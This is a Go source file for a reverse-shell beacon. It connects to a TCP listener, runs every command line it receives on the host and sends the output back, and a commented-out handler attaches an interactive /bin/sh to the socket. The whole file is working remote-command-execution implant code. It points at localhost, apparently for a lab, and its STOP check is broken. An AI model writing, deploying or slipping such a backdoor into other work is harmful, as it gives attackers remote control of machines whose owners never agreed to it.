package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
)

// func handle(conn net.Conn) {

// 	/*
// 	 * Explicitly calling /bin/sh and using -i for interactive mode
// 	 * so that we can use it for stdin and stdout.
// 	 * For Windows use exec.Command("cmd.exe")
// 	 */
// 	// cmd := exec.Command("cmd.exe")
// 	cmd := exec.Command("/bin/sh", "-i")
// 	rp, wp := io.Pipe()
// 	// Set stdin to our connection
// 	cmd.Stdin = conn
// 	cmd.Stdout = wp
// 	go io.Copy(conn, rp)
// 	cmd.Run()
// 	conn.Close()
// }

func main() {
	beacon, err := net.Dial("tcp", "127.0.0.1:6969")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		// netData, err := bufio.NewReader(beacon).ReadString('\n')
		// if err != nil {
		// 	fmt.Println(err)
		// 	return
		// }
		// fmt.Print("-> ", string(netData))

		CmdOut := ""
		text, _ := bufio.NewReader(beacon).ReadString('\n')
		message := strings.Split(text, "\n")
		// if message[0] == "" {
		// 	time.Sleep(3 * time.Second)
		// 	continue
		// }
		if message[0] != "" {
			fmt.Print("->: " + message[0])
			tokens := strings.Split(message[0], " ")
			var c *exec.Cmd
			if len(tokens) == 1 {
				c = exec.Command(tokens[0])
			} else {
				c = exec.Command(tokens[0], tokens[1:]...)
			}
			buf, err := c.CombinedOutput()
			if err != nil {
				CmdOut = err.Error()
			}
			CmdOut += string(buf)
			// fmt.Print(CmdOut)
			fmt.Fprintf(beacon, CmdOut+"~w")
			continue
		}

		if strings.TrimSpace(string(CmdOut)) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
	}

}
